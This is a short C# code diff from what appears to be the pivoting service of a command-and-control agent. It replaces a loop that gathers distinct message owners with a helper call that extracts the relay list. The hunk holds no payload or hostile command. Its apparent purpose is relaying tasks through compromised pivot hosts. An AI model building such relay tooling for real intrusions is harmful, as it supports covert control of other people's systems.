@@ -106,12 +106,7 @@ namespace Agent.Service.Pivoting
                 var responses = Encoding.UTF8.GetBytes(content).Deserialize<List<MessageResult>>();
                 _messageService.EnqueueResults(responses);
 
-                List<string> relays = new List<string>();
-                foreach (var mr in responses)
-                {
-                    if (!relays.Contains(mr.Header.Owner))
-                        relays.Add(mr.Header.Owner);
-                }
+                var relays = this.ExtractRelays(responses);
 
                 var tasks = this._messageService.GetMessageTasksToRelay(relays);
 
